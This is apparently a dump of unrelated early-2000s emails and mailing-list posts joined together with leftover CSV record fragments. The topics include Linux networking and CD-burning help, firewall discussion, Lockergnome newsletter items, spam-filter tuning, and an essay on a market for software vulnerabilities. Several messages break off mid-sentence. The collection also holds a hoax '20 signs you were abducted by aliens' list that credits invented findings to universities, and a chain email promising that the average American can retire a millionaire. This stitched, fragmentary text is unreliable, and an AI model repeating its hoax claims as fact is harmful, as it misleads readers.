 time-space continuum? can someone explain this in words of five syllables 
 or less?

 Hisax is one of the ISDN modules : doesn't apply at all in this
 case and won't affect your system.
 
 Can't really help with the rest, soz.

 Nope, indeed IPFW2 has just been rolled out into -STABLE. (-STABLE
 is a stable branch of the code that has been rolled into -CURRENT
 first. It's basically a major release, that's still a work in
 progress)

 I don't really judge things by uptimes, it's rather like judging
 penis size. People like comparing them, and the larger they are, the
 more people are in awe of them, but overly large ones aren't really
 practical!

 Defiantely. I wouldn't like anyone to accuse me of being a
 nit-picker though ;)

 Well, as someone who's used ipchains quite heavily about two years
 ago, I can guarantee you that the learning curve for reading
 ipchains rules and ipfw rules is quite different. Of course once
 you've memorised (not necessarily sitting down with a sheet of them
 and learning them off by rote) them, you wonder what all the fuss is
 about before.
 
 It's not in itself a reason to choose one firewall product over
 another, but if that's all there is in the difference, and the
 learning curve for the Operating System is the same, then I know
 what I'd prefer, as a beginner.
 
 This is all getting rather off-topic now anyways, but since I've
 been doing quite a lot of work with ipfw over the last week I jumped
 on the bandwagon.

422,"Subject: Fw: The Gold Buddha
","In 1957, a monastery in Thailand was being relocated and a group of monks
 was put in charge of moving a giant clay Buddha. In the midst of the move
 one of the monks noticed a crack in the Buddha. Concerned about damaging the
 idol, the monks decided to wait for a day before continuing with their task.
 When night came, one of the monks came to check on the giant statue. He
 shined his flashlight over the entire Buddha. When he reached the crack he
 saw something reflected back at him. The monk, his curiosity aroused, got a
 hammer and a chisel and began chipping away at the clay Buddha. As he
 knocked off piece after piece of clay, the Buddha got brighter and brighter.
 After hours of work, the monk looked up in amazement to see standing before
 him a huge solid-gold Buddha.
 
 Many historians believe the Buddha had been covered with clay by Thai monks
 several hundred years earlier before an attack by the Burmese army. They
 covered the Buddha to keep it from being stolen. In the attack all the monks
 were killed, so it wasn't until 1957, when the monks were moving the giant
 statue, that the great treasure was discovered. Like the Buddha, our outer
 shell protects us from the word: our real treasure is hidden within. We
 human beings unconsciously hide our inner gold under a layer of clay. All we
 need to do to uncover our gold is to have the courage to chip away at our
 outer shell, piece by piece.
 
 Could you be sitting on your own gold mine? Did you know the average
 American can retire a millionaire on his or her current income? Then, why
 don't they? It's simple. They haven't been taught that they could. They are
 taught to use debt to get what they want now instead of having their money
 work for them. They pay too much in taxes. They are wasting money every
 month and don't even realize it. In short, they are financially unhealthy.

 I'm skeptical.  
 
 One of the many perversions of modern civilization is the fictitious
 rendering of various peoples, frequently to the point where the fiction
 is more ""real"" than the reality.  You see it over and over again in
 history:  The Primitive People pull a fast one on Whitey The Junior
 Anthropologist, playing to all the prejudices of Whitey (who only became
 Junior Anthropologists to support personal ideologies), and before you
 know it the charade takes on a life of its own which the Primitive
 People are compelled to perpetuate.  Worse, even when there is
 substantial evidence to the contrary with some basic scholarship, the
 facts have a hard time competing with the ideologically pleasing fiction
 that is already firmly entrenched.  And many peoples (e.g. American
 Indians) develop a profit motive for maintaining and promoting the myth
 in popular culture.
 
 I'm far more inclined to believe that people is people, no matter where
 you are on the planet.  The only time you see any anomalies is when you
 have a self-selecting sub-population within an otherwise normal
 population, which is hardly a fair way to look at any major population.

 20 NEW SIGNS THAT YOU WERE ABDUCTED BY SPACE ALIENS!
 
 WINSTON-SALEM, N.C. -- You may have been abducted by space aliens --
 and not even know it!
 
 Psychiatrists, psychologists and UFO experts say millions of people
 all over the world have been kidnapped by extraterrestrials. But most
 of them can't recall the experience because the memory is so painful
 that they've buried it deep in their subconscious minds.
 
 But there are strong tip-offs that you may be one of the millions who
 have encountered beings from another planet, if you know what to watch
 for.
 
 Experts at Wake Forest University here, as well as other respected
 institutions around the world, offer 20 startling new indicators that
 you may have had a close encounter:
 
 1. You experience unexplained nausea or a strange sense of uneasiness
 around the same time each day.
 
 2. You have an unusual new scar or strange mark on your body --
 particularly on the roof of your mouth or behind an ear.
 
 3. You often find yourself hungry for oranges or lemons -- even after
 you've had a large meal or eaten enough food to fill your
 stomach. Researchers at Oslo University say this hunger for citrus is
 common in alien abductees.
 
 4. You have a strong, ever-present feeling that there is some mission
 or important thing you're supposed to do in life and you find yourself
 constantly driven to achieve it or discover what it might be.
 
 5. You often find yourself going through your trash, or the trash of
 others, without knowing exactly what you're looking for. Swiss UFO
 researchers found that people who have been abducted often find
 themselves unaccountably digging through refuse.
 
 6. You frequently dream of cattle. Psychologists at the University of
 Paris say it's common for the subconscious mind to substitute a cow or
 bull for an alien being.
 
 7. You feel you're ""special"" or ""chosen.""
 
 8. You are a vegetarian -- but can't exactly explain why.
 
 9. You have an overpowering feeling of dread when you see photos or
 drawings of space aliens.
 
 10. You are prone to addictive or compulsive behavior. This in itself
 is not necessarily indicative of alien abduction. But if there are
 other indicators as well, you could be an abductee.
 
 11. You wet the bed. Studies in Peru show there's a connection.
 
 12. You have frequent insomnia.
 
 13. You are strangely intrigued by old western movies. Psychologists
 say they can't yet explain abductees' fascination with cowboy movies,
 but they say it exists in at least 75 percent of victims.
 
 14. Electronic devices often go haywire around you for no discernible
 reason.
 
 15. You have seen -- or think you've seen -- a mysterious, hooded
 figure in or near your home more than once.
 
 16. Your fingers are stiff, numb or unresponsive for more than an hour
 after you wake up.
 
 17. You have had -- or currently have -- severe back or neck problems.
 
 18. You frequently experience a ringing in one ear.
 
 19. You often get sinusitis or other nasal pain.
 
 20. You are frequently haunted by the sense that you're being watched.

 I can't stand it either when it's at work or home and I'd planned on doing
 something that required network access... but I really feel like I need a
 break now, away from work pressure that almost drove me nuts all summer!
 Ah, the joys of responsibilities... :-/
 
 Six days without computers ahead, but six days driving my 600 Bandit
 roadster bike! I won't be miserable nor get bored, don't worry for me ;-)
 I also have the first Lord of the Rings book to finish (half way through
 now) and the two others to read... lots of ""sane"" and non-wired occupations
 ahead!
 Oh, did I mention beer drinking with friends? :-))))

 ---------------------------------------------------------------------------------------------------------------------
 
 http://www.bayarea.com/mld/mercurynews/news/opinion/3900215.htm
 
 Internet can level the political playing field
 By Mike McCurry and Larry Purpuro
 
 NOT many months from now, people across the country will experience one 
 of the great recurring features of American democracy. At shopping 
 malls, on factory floors, at church socials and even on our front 
 stoops, we will be approached by individuals who want to represent us in 
 public office. While chances are high that we won't know them 
 personally, they will walk up to us, offer a handshake and a flier and 
 ask for our votes.
 
 Just as technology is affecting every other area of communication, it 
 has begun to affect the way political candidates communicate with voters.
 
 In this year's GOP gubernatorial primary, California Secretary of State 
 Bill Jones, who faced better-funded candidates, acquired the e-mail 
 addresses of more than a million potential California voters and sent 
 each an unsolicited e-mail asking for support.
 
 That day, he might have chosen any of the more traditional -- and more 
 expensive -- methods of contacting voters, such as direct mail, radio 
 spots or TV ads. But he spent only about 2 cents per message, instead of 
 35 cents or more per message for direct mail or in another medium.
 
 Had Jones chosen direct mail, radio or TV, that communication would have 
 been equally ``unsolicited,'' as defined in the e-mail world. Few voters 
 would have ``opted in'' to receive campaign information from Jones 
 through any of those channels.
 
 The response to Jones' e-mail effort, however, was swift and intense. He 
 was lambasted by anti-spam advocates, and media coverage was almost 
 entirely negative. To be fair, some of Jones' tactics could have been 
 refined. He used a less-than-perfect list and no standard-practice 
 ``paid for'' disclaimer in the message.
 
 His detractors, however, attacked him not for his tactical miscues but 
 because the e-mail was sent unsolicited. In fact, Jones' online campaign 
 may have been his most visible asset. In an era of cynicism toward money 
 in politics -- money typically spent on other unsolicited communication 
 mediums -- Jones tried to level the playing field.
 
 No one likes commercial spam. It is irrelevant and untargeted and can be 
 highly intrusive and even offensive. But as a sophisticated society, 
 it's time to differentiate commercial spam from very different 
 unsolicited e-mail sent by political candidates to voters.
 
 The debate is particularly relevant in light of legislation in Congress 
 that would constitute the first federal law to directly address spam. We 
 believe e-mail is no more intrusive than direct mail, telemarketing or 
 TV advertising when it comes to politicians seeking to reach voters. A 
 simple link in good e-mail campaigns allows recipients to opt out of 
 future mailings. Direct mail takes at least a phone call or stamp to be 
 taken off a list, and viewers must repeatedly endure TV ads.
 
 When a candidate lacks a large campaign war chest, he or she can use the 
 Internet to provide constituents with information to better prepare them 
 to perform their civic duty of casting educated votes. With more than 60 
 percent of all potential voters in this country possessing e-mail 
 accounts, it makes sense that political candidates use this medium.
 
 Candidates might avoid some of the tactical problems encountered by the 
 Jones campaign if they use the technologies available today that better 
 ensure quality of e-mail lists and target content to specific recipient 
 groups.
 
 But the broader point remains. When a political candidate sends a voter 
 an e-mail, that recipient can choose to delete the message without 
 opening it, unsubscribe from the list, read it or even reply and engage 
 the sender. That choice should belong to the voter -- not to anti-spam 
 advocates whose efforts are better focused on commercial e-mail. 
 Political candidates should be free to communicate with voters as best 
 they can, and let voters decide what to do with that information.

 I've run into a fairly intractable (for me) problem, and was wondering
 if anybody could give me pointers on how to deal with it.
 
 I am running Debian Woody on a Pentium III IDE based system.
 I have a Ricoh 7083a ide cd rewriter, which I use using cdrecord and the
 scsi over ide kernel modules.  I was running kernel 2.4.18 until
 probably last weekend when I noticed 2.4.19 was out.  Downloaded patch
 and installed new kernel with no real problems.  This morning I went to
 burn a CDROM, and the system locked hard.  Rebooting into 2.4.18 allowed
 cdburning to work fine.
 
 This problem is very reproducible (on my system at least).
 the cdrecord command I was using was
     cdrecord -v speed=4 blank=fast dev=0,1,0 -data bak.iso
 The blanking appears to go ok, but when it tries to write data, it just
 locks up the entire system (can't ping it from outside even).  AFAICS,
 the system just stops.  Hard reset is only way back in, and when it does
 reboot, I cannot see anything useful in any logfiles (/var/log/messages
 /var/log/kern.log /var/log/syslog, at any rate).
 cdrecord -scanbus works fine and reports the two pseudo-scsi devices (my
 cdr drive and my cdrw).
 The same lock occurs even if there is no blanking.
 
 I tried upgrading to 2.4.20-pre1-ac1 (on assumption that if there was a
 kernel issue it might have been fixed in these patches), but it gives
 the same error.  I also downloaded and compiled the source for
 cdrecord 1.1.10, and installed it instead of the debian package (i was
 wondering if maybe there was some compile option the packager had used
 which maybe would cause the problem), and still the problem persisted.
 
 Anyway, I'm completely stumped.  Google searching has not done me much
 good, and I'm a little bit lost.  What I'd like to know is
 a)  How to fix the problem ;-)
 b)  Is this likely to be an application or kernel problem?  The severity
     of the crash would make me suspect it is a kernel problem, but I'm
     not very knowledgeable on these things.
 c)  Should I post a description of this to the kernel mailing list? If
     this is an appropriate course of action, are there any tips (beyond
     the guidelines on kernel.org)?
 
 Like I said, I'm lost on this one, so any info is very gratefully
 received.

 I don't go to many concerts, but that doesn't mean I don't
 appreciate listening to <a href=""http://mp3.lockergnome.com/"">good
 music</a> at every waking moment. Tonight, a handful of Bay
 Gnomies and I watched They Might Be Giants rock the Fillmore.
 Melanie, Steve, Brent, Missy, Robert, Patrick, Gretchen, Matt, and
 Mindy had a total blast. Well, it wasn't much fun when Robert got
 his digital camera confiscated - but this was a show worthy of
 five <a href=""http://www.squeeek.com/brent/blog-archives/000438.html"">megapixels</a>
 (believe me)! Brent went to
 the show last night, and I saw them play on the set earlier this
 afternoon. They were selling a new CD (which had JUST been
 released the other day); ""They Got Lost"" is full of a few
 previously-unavailable tracks. If you aren't sure about purchasing
 it outright, I strongly urge you to sign up for a trial <a
 href=""http://mp3.lockergnome.com/"">EMusic account</a> and download
 a few of their songs in MP3 format. Oh, and check out the opening
 act: Noe Venable. She's got
 <a href=""http://www.noevenable.com/music.php"">a few free MP3s</a> on
 her site, too. Give ""Boots"" a shot - very nice.
 
 <p>
 
 Does anybody know how to set a binary clock? Melanie got it for me
 as a gift (which was a very nice gesture). Sure, I could read the
 manual - but the ones and zeros start to look eerily similar after
 flipping past the first page. You know me: I'm not much of a math
 guy. In fact, I just discovered the other day that 'byte' was
 short for 'by eight' (even though I already knew that 'bit'
 represented 'binary digit'). I'd stick with a digital timepiece,
 but it just isn't geeky enough for me anymore. How sad is that?
 I'm ready to walk on the wild side. Maybe I'll get my laptop
 pierced tomorrow? It could happen. I've been known to do nutty
 things on a moment's notice, like changing my default Web browser.
 Courtesy of <a href=""http://www.newarchitectmag.com/documents/s=2415/na0802q/"">Asa
 Dotzler</a>, I have an official Mozilla sticker, CD, and t-shirt
 (which you saw me model in my Webcam the other day). Don't be too
 jealous; <a href=""http://www.mozilla.org/"">Mozilla.org</a> has
 plenty of goodies to go around.
 
 <p>
 
 Looks as though <a href=""http://www.lockergnome.com/issues/digitalmedia/20020717.html"">Jake
 and Lori</a> are already having a blast in St. Louis.
 They're at the Shareware Industry Conference, along with hundreds
 of well-known program programmers - the people who make our
 computers work the way we want them to work! We're doing our best
 to convince them to join us at <a href=""http://www.gnomedex.com/"">Gnomedex</a>. They ask: ""Who else
 is going to be there?"" We answer: ""People who don't know you yet.""
 They ask: ""Then why should I come?"" We answer: ""Because it's a
 business opportunity for you."" They ask: ""What if I don't want to
 learn anything or meet anybody?"" We answer: ""We can't really help
 you there, but here - have lunch on us."" They ask: ""Oh, the
 admission price includes food at at Gnomedex?"" We answer: ""We
 cannot provide every meal, but you won't go hungry."" They ask:
 ""So, why Des Moines, when there's nothing to do there."" We answer:
 ""You're 100% wrong. There *IS* something to do there: Gnomedex.""
 Get it? Got it? Good.

 {String on your finger} Sometimes, I'm a bit like the absent-minded professor... I would forget my own head if it wasn't attached. So naturally, I appreciate any program that can help keep me on track, and with GigAlarm I can setup whatever reminders/alarms I need. However, sometimes a simple text message just won't catch my attention. Well, herein lies the beauty of GigAlarm... it doesn't just have to give you a text alarm! GigAlarm can play a WAV file (random, or your selection), change your background, start a program, or use one of the many Windows shutdown options. My wife has gotten in the habit of using the Shutdown option as an alarm to signal that I have spent too long on the computer. (Lucky for me, there is a snooze button!) NOTE: The author says, ""This program is essentially free to use for non-profit purposes... If you find this program useful I would appreciate $10 AUD (or $5 USD) as a token of your appreciation.""

 {Peep show} I'm not always very patient, especially when it comes to my computer. Double-clicking on an image and waiting for it to come up in my image viewer is almost too much for me to handle. Lucky for me, Context Thumbview has made its way onto my system and I no longer have to wait to view an image. All I do now is right-click the image, choose ""View Thumbnail,"" and there is the image, out there for me to see... all without me having to open up any programs! ""As Express ThumbView is an Explorer extension, it is always ready and available for use. Moreover, it is available in any Explorer window, including Open and Save As... dialog boxes."" As an added bonus, with Context Thumbview installed on my system, I can also turn off the thumbnail view if I want to save system resources.

 {Startup manager} This application bills itself as ""Yet Another Startup Manager""... I don't think so! Starter isn't JUST another Startup Manager, it's a piece of programming art. One of my biggest problems with Windows Task Manager is that I don't know what all the processes on my machine are, or from where they are running. Starter not only gives me that information, but it also lets me save it as an HTML file. In addition, Starter lets me import and export registry keys or add a new task to be processed. Don't run all over your machine trying to find all the programs you need to control your PC, when you can do it all (and more!) with Starter.

 {Sticky notes} Did you know that Post-it(r) Notes were invented by accident? I use to have these notes all over my monitor. Now my screen is clean as a whistle! Aversoft Sticker is a program to help you remember ""important information by displaying skinnable sticky notes on your Windows desktop."" No more bland notes for me! With Sticker, I am surrounded with pictures of paradise (downloaded from Aversoft's website). These great features are no accident. Sticker also has a transparency feature that makes the notes only half visible, making it much easier to use while working on your other programs. Don't walk away yet though... Sticker also allows you to print your notes, lock them from accidentally being deleted, and set an alarm (repeating or one-time). Speaking of alarms, mine just went off and opened up Outlook. Time to send out today's newsletter!

 Gnomies are known for their willingness to help others and Alex Warren is no exception with a tip on copying text. Alex writes: ""Did you know that you can copy the contents of a message/dialog box just by pressing Ctrl+C?"" Alex also had this to say: ""When you select text and then use the mouse to drag it to a new location, the original text moves to the new location and disappears from the old location. However, you can select text and then use the right mouse button to drag it to a new location. When you do this, releasing the right mouse button opens a menu from which you can choose to move or copy the text (along with several other options)."" Those are some great time saving tips Alex! Following suit with using Ctrl + C to copy... you can also use Ctrl + X to cut and Ctrl + V to paste. You can also use all these tips on more then just text! The next time you need to copy some files on your PC, try the right-click and drag method and you will see what I mean... along with saving yourself some time.

 THE BUZZ ABOUT THE UPCOMING MOVIE
 
 People are already talking about the sensitive subject of kids and drug addiction featured in ""The Secret Life of Zoey.""
 Lifetimetv.com community member BELFAST BELLE writes:
 ""My belief is that I started using drugs to fit in and to cope with things that happened to me. My mom died when I was 10. I had to live away from my dad and brothers. Where I grew up I was sexually abused for years, but I didn't dare tell anyone. When I finally went to live with my dad and brothers, I had no self-esteem left. I experienced so much shame, and in my mind it seemed as if everyone knew what happened. Drugs helped me to feel OK and like I was a part of something. When my dad died, I was devastated. It threw me into a full-blown addiction. My drug use landed me in rehab, in debt and in strained relationships with my brothers. Thanks to the help of Narcotics Anonymous, I have been clean since December 28, 1991. I now have great relationships with my siblings. I love them more than they will ever know. I also have a beautiful seven-year-old daughter who has never seen her mother touch drugs. I don't have any desire to use, either -- just the desire to be the best pe
  rson I can be.""

442,"Subject: RE: sprint delivers the next big thing??
","thx for the thoughts gentlemen (yes as someone said i use terms loosely) -
 
 more than cool --->
 
 quality: snobs only care about mpixels. this is about communications.  the
 general public cares about speed not quality.  how is akamai doing these
 days? not to mention any other QOS businesses that come to mind.
 
 implementation: point about hooking to usb, wires, etc. AGREE 100%. these
 implementations are super clunky, attachable camera needs to be integrated a
 la nokia model.  basically useless until better handsets are released i
 think.
 
 adoption: ian brought up the 'fax' problem.  brilliant thing is, this is far
 more personal than faxes so can be justified more easily and marketed in
 family packs etc. but yes, the usual rules apply as MMS phones have network
 efx.
 
 content: who cares about content?  that no one can think of 'useful' content
 is always the business persons mistake. the content is the users
 communications.  its anything and everything.  avg person could easily send
 half dozen pics to a dozen people a day.  mainly humorous i'd guess. who
 cares if content is trivial in nature. picture speaks a thousand words.
 
 display: why are dig camera displays better than cell phones?  does anyone
 know who makes these small displays and what the trends are around them?
 
 misc ramblings: i suppose you skeptical forkers would have said the same
 thing about '1 hour photo' processing.  trivial, who needs it, i get better
 resultion elswhere.  and yet, it had great decentralizing impact - the plant
 had to be downsized and pushed to the retail operation - the digital camera,
 and finally the integrated digital camera phone brings this cycle of
 decentralization in photography to a logical conclusion (which will put the
 photo giants to bed) and change the world in a meaningful way.  also, SMS
 didn't take off because its easy, it took off because it costs less.  its
 greatly ironic the carriers often trumpet the 'profitabilty' of their SMS
 traffic over others because of its ratio of cost to bandwidth.  in reality,
 SMS cannibilizes the voice rev's they bought their networks to handle.
 
 ps:  it is relatively amusing that one 'low resolution' complaint dropped
 just after Joe watched a CARTOON on his television..
 
 You're right. Or at least, I don't. I saw an advert for it on TV last
 night (can't miss Futurama :-) and I thought, ""boy, that's dumb.""
 If I wanted to share pictures with someone, I'd email them to them,
 where they could see them on a 1024x or 1600x display, instead of

 Remote realtime streaming video is neat, but sharing pictures? You invoke
 big words rather readily.

","Hi guys,
 	I'm looking for help on this one. I have a server with SME5.5 installed
 - used to be e-smith. It's based on RH7.1, has a 3c507 NIC, and is
 connected to a hub. Also connected to the hub are a laptop and
 workstation, both with RH7.3 . The server supplies DHCP amongst other
 things.
 	The problem is interruptions in the network. If I ping the laptop from
 the workstation, or the other way around, there are no problems, i.e.
 shows up as 0% loss. If however I ping the server from the laptop or
 workstation, it will do a few packets, anywhere from 3 to 20, and then
 stop responding, it will start again after a little while.
 	The server is definitely not overloaded, 128Mb, and seems to be
 configured correctly. In /etc/modules.conf,;
 
 options 3c507 irq=0x5 io=0x300
 alias eth0 3c507
 
 there is an option in there for something called hisax, but whatever
 that is, the machine doesn't have one.
 	doing route shows 192.168.0.0 as going through eth0 which is correct.
 
 	Any help on this appreciated.

 About this question: No, that's currently not possible. But I was thinking 
 about implementing a feature like this; it might be in the next release.

 Yes, it is...  But then alsa-driver requires alsa-kernel, and I don't quite 
 like --nodeps...

 That's ok.  I was only considering it for the sake of tweaking anyway, not 
 for some real-world need :).

 Um...  I keep 2.4.18-12.2 for emergency sitations (like I forget to include 
 keyboard support in kernel, dumb me), but alsa-kernel_2.4.18-10 does not 
 require kernel-2.4.18-10, so that's ok.

 There's also an 'objdump' program, and 'biew' hex viewer/disassembler. A good 
 starting point to search is http://www.freshmeat.net/
 
 However, cracking and reverse engineering tools are not so ubiquitous on UNIX as 
 they are on Windows platform for two main reasons:
 
 1. The main customers of commercial Unices (Solaris, HP-UX, Aix, SCO...) are 
 respectable companies. They are ready to pay big bucks for software they need: the reputation matters.
 
 2. Most software for free and open source Unices like Linux and xBSD (this 
 software often may be used on commercial unices as well) is, well, free and 
 open source.

 I suppose it is - however, nobody knows that
 this message is a response to your one or a 
 follow-up to my own first message. 
 
 With a newsgroup structure, this is obvious. 
 
 This helps the reader eliminate threads which

 This only restates the assertion, it doesn't clarify /how/ government
 restrains you, other than under laws of criminal conduct and violent
 crimes (if you meant the above literally)
 
 If I can trace a spammer to their ISP, I can /generally/ get that
 account revoked, and if you trace one to their parent corporation, I
 don't know of any law that specifically /exempts/ them from lawsuits,
 it's just that no one has yet succeeded in any important way.  If you
 have some law that prevents action against spammers, then why all the
 class-action suits and other anti-spam court cases, some even
 state-funded?
 
 I'm also curious of the mechanics of your retribution strategy: Let's
 say you did win a lawsuit and shut down the largest spammer network in
 the USA, do you really believe 40 Beijing spammers won't fill the
 void?  Do you really believe those 40 are not right now prepping their
 mail servers whether or not you prevail over your countrymen? How do
 you intend to take legal (and/or violent) action against people a
 world away and in a culture you can barely understand let alone
 understand how to properly bribe?  
 
 I'm not so hopeful this method can work against aromatherapy viagra
 when we can't even track and convict murderous Nigerian mafia, and
 they are blatant!  Political solution is a contradiction in terms, and
 it's also true that no lawmaker has ever been even a tenth the
 catalyst on improving the quality of life in Britain and the western
 world as did central heating and the invention of one A.J.Crapper.

 I *meant* to say that they were 0.99 clues cancelled out by 0.01
 clues.  But that's wrong too!  It looks I haven't grokked this part of
 your code yet; this one has way more than 16 clues, and it seems the
 classifier basically ended up counting way more 0.99 than 0.01 clues,
 and no others made it into the list.  I thought it was looking for
 clues with values in between; apparently it found none that weren't
 exactly 0.5?
 
 > That sure sets the record for longest list of cancelling extreme clues!
 
 This happened to be the longest one, but there were quite a few
 similar ones.  I wonder if there's anything we can learn from looking
 at the clues and the HTML.  It was heavily marked-up HTML, with ads in
 the sidebar, but the body text was a serious discussion of ""OO and
 soft coding"" with lots of highly technical words as clues (including
 Zope and ZEO).

 Are there any minable-but-unmined header lines in your corpus left?
 Or do we have to start with a different corpus before we can make
 progress there?

 No, sorry.  These were all of the following structure:
 
   multipart/mixed
       text/plain        (brief text plus URL(s))
       text/html         (long HTML copied from website)
 
 I guess you get this when you click on ""mail this page"" in some

 Still?

 I think it's still corpus size.

 This time the problem seems to be that I overestimated xine-lib's configure

 arts-devel installed, its support will be compiled in :-/
 
 Also, I had made another mistake and added the configure option to disable

 Rob ""Pringles Can"" Flickenger and others Cliff Skolnik at the O'Reilly OS X con

 here -- every 20 or 30 seconds, you start getting ""connection refused"" messages 
 from your browser and other net-utilities. Rob ""Pringles Can"" Flickenger wrote 
 it up. 
 
 It turns out that running the great network-spy app Etherpeg[1] (or other 
 ""promiscuous"" network sniffers) and the built-in firewall in OS X at the same 
 time causes your computer to begin intercepting every packet sent out on your 
 segment of the wireless network and respond to it with a ""rejected"" message. 
 
 So today, Rob (and everyone else who knows about this) is going to run around 
 and tell people running Etherpeg to _turn off the firewall_ (and vice-versa). 
 Ah, fickle networking, you are such a stern mistress! Link[2] Discuss[3] (_

477,"Subject: Re: the underground software vulnerability marketplace and its
","Hi Kragen,
 
    This is an interesting analysis.  I think that there are a couple
 of nits I might pick (for example, I don't expect that the market will
 be well developed with highest bidders for while), I think that the
 most important issue, which is that end users won't be able to fix
 their systems, is almost passed over.  I know that you know this, and
 you allude to it, but your essay is getting passed around, so you
 might want to add to it bits about the sysadmin and others.
 
    There's one other point which you don't make, which I think is very
 important, which is that research into defining and addressing classes
 of vulnerabilities can't happen without libraries of available
 vulnerability code.  I can think of three researchers into automated
 methods for addressing vulnerabilities who griped, uninvited, about
 the quality of the existing vulnerability sites.  Doing research into
 a set requires that you have enough examples, in the open, that you
 can define a set, and that the set is added to from time to time so
 you can make and test predictions.
 
    I feel fairly confident in saying that without full disclosure, we
 wouldn't have Stackguard, ITS4, Nissus, or snort.  And the security
 admin's job would be a lot harder.

 | To: fork@example.com
 | Subject: the underground software vulnerability marketplace and its hazards
 | 
 | On August 7th, an entity known as ""iDEFENSE"" sent out an announcement,
 | which is appended to this email.  Briefly, ""iDEFENSE"", which bills
 | itself as ""a global security intelligence company"", is offering cash
 | for information about security vulnerabilities in computer software
 | that are not publicly known, especially if you promise not to tell
 | anyone else.
 | 
 | If this kind of secret traffic is allowed to continue, it will pose a
 | very serious threat to our computer communications infrastructure.
 | 
 | At the moment, the dominant paradigm for computer security research
 | known as ""full disclosure""; people who discover security
 | vulnerabilities in software tell the vendor about them, and a short
 | while later --- after the vendor has had a chance to fix the problem
 | --- they publish the information, including code to exploit the
 | vulnerability, if possible.  
 | 
 | This method has proven far superior to the old paradigm established by
 | CERT in the late 1980s, which its proponents might call ""responsible
 | disclosure"" --- never release working exploit code, and never release
 | any information on the vulnerability before all vendors have released
 | a patch.  This procedure often left hundreds of thousands of computers
 | vulnerable to known bugs for months or years while the vendors worked
 | on features, and often, even after the patches were released, people
 | wouldn't apply them because they didn't know how serious the problem
 | was.
 | 
 | The underground computer criminal community would often discover and
 | exploit these same holes for months or years while the ""responsible
 | disclosure"" process kept their victims, who had no connections in the
 | underground, vulnerable.
 | 
 | The problem with this is that vulnerabilities that are widely known
 | are much less dangerous, because their victims can take steps to
 | reduce their potential impact --- including disabling software,
 | turning off vulnerable features, filtering traffic in transit, and
 | detecting and responding to intrusions.  They are therefore much less
 | useful to would-be intruders.  Also, software companies usually see
 | security vulnerabilities in their software as PR problems, and so
 | prefer to delay publication (and the expense of fixing the bugs) as
 | long as possible.
 | 
 | iDEFENSE is offering a new alternative that appears far more dangerous
 | than either of the two previous paradigms.  They want to be a buyer in
 | a marketplace for secret software vulnerability information, rewarding
 | discoverers of vulnerabilities with cash.  
 | 
 | Not long before, Snosoft, a group of security researchers evidently
 | including some criminal elements, apparently made an offer to sell the
 | secrecy of some software vulnerability information to the software
 | vendor; specifically, they apparently made a private offer to
 | Hewlett-Packard to keep a vulnerability in HP's Tru64 Unix secret if
 | HP retained Snosoft's ""consulting services"".  HP considered this
 | extortion and responded with legal threats, and Snosoft published the
 | information.
 | 
 | If this is allowed to happen, it will cause two problems which,
 | together, add up to a catastrophe.
 | 
 | First, secret software vulnerability information will be available to
 | the highest bidder, and to nobody else.  For reasons explained later,
 | I think the highest bidders will generally be organized crime
 | syndicates, although that will not be obvious to the sellers.
 | 
 | Second, finding software vulnerabilities and keeping them secret will
 | become lucrative for many more talented people.  The result will be
 | --- just as in the ""responsible disclosure"" days --- that the good
 | guys will remain vulnerable for months and years, while the majority
 | of current vulnerabilities are kept secret.
 | 
 | I've heard it argued that the highest bidders will generally be the
 | vendors of the vulnerable software, but I don't think that's
 | plausible.  If someone can steal $20 000 because a software bug lets
 | them, the software vendor is never held liable; often, in fact, the
 | people who administer the software aren't liable, either --- when
 | credit card data are stolen from an e-commerce site, for example.
 | Knowing about a vulnerability before anyone else might save a web-site
 | administrator some time, and it might save the software vendor some
 | negative PR, but it can net the thief thousands of dollars.
 | 
 | I think the highest bidders will be those for whom early vulnerability
 | information is most lucrative --- the thieves who can use it to
 | execute the largest heists without getting caught.  Inevitably, that
 | means organized crime syndicates, although the particular gangs who
 | are good at networked theft may not yet exist.
 | 
 | There might be the occasional case where a market leader, such as
 | Microsoft, could make more money by giving their competitors bad PR
 | than a gang could make by theft.  Think of a remote-root hole in
 | Samba, for example.
 | 
 | Right now, people who know how to find security exploits are either
 | motivated by personal interest in the subject, motivated by the public
 | interest, motivated by a desire for individual recognition, or
 | personally know criminals that benefit from their exploits.  Creating
 | a marketplace in secret vulnerability information would vastly
 | increase the availability of that information to the people who can
 | afford to pay the most for it: spies, terrorists, and organized crime.
 | 
 | Let's not let that happen.

 | Subject: Introducing iDEFENSE's Vulnerability Contributor Program
 | 
 | 
 | Greetings,
 | 
 | iDEFENSE is pleased to announce the official launch of its Vulnerability
 | Contributor Program (VCP). The VCP pays contributors for the advance
 | notification of vulnerabilities, exploit code and malicious code.
 | 
 | iDEFENSE hopes you might consider contributing to the VCP. The following
 | provides answers to some basic questions about the program:
 | 
 | Q. How will it work?
 | A. iDEFENSE understands the majority of security researchers do not publish
 | security research for compensation; rather, it could be for any of a number
 | of motivations, including the following:
 | 
 |          * Pure love of security research
 |          * The desire to protect against harm to targeted networks
 |          * The desire to urge vendors to fix their products
 |          * The publicity that often accompanies disclosure
 | 
 | The VCP is for those who want to have their research made public to the
 | Internet community, but who would also like to be paid for doing the
 | work.The compensation will depend, among other things, on the following
 | items:
 | 
 |          * The kind of information being shared (i.e. vulnerability or exploit)
 |          * The amount of detail and analysis provided
 |          * The potential severity level for the information shared
 |          * The types of applications, operating systems, and other
 |            software and hardware potentially affected
 |          * Verification by iDEFENSE Labs
 |          * The level of exclusivity, if any, for data granted to iDEFENSE
 | 
 | Q. Who should contribute to the VCP?
 | A. The VCP is open to any individual, security research group or other
 | entity.
 | 
 | Q. Why are you launching this program?
 | A. Timeliness remains a key aspect in security intelligence. Contributions
 | to some lists take time before publication to the public at large. More
 | often, many of these services charge clients for access without paying the
 | original contributor. Under the iDEFENSE program, the contributor is
 | compensated, iDEFENSE Labs verifies the issue, and iDEFENSE clients and the
 | public at large are warned in a timely manner.
 | 
 | Q. Who gets the credit?
 | A. The contributor is always credited for discovering the vulnerability or
 | exploit information.
 | 
 | Q. When can I contribute?
 | The VCP is active. You are welcome to begin contributing today.
 | 
 | To learn more, go to http://www.idefense.com/contributor.html. If you have
 | questions or would like to sign up as a contributor to the VCP, please
 | contact us at contributor@idefense.com.

 Hmmm...  I just upgraded from my modified 2.31 to a slightly modified 2.40

 Alas, that's wrong. Both the drives are faster (10..15 krpm vs. ~7 krpm,
 faster seek), and the EIDE protocol is ridiculously dumb (queing;
 disconnect).

 None of them are production quality. Right now only ext2 and ext3 qualify.  
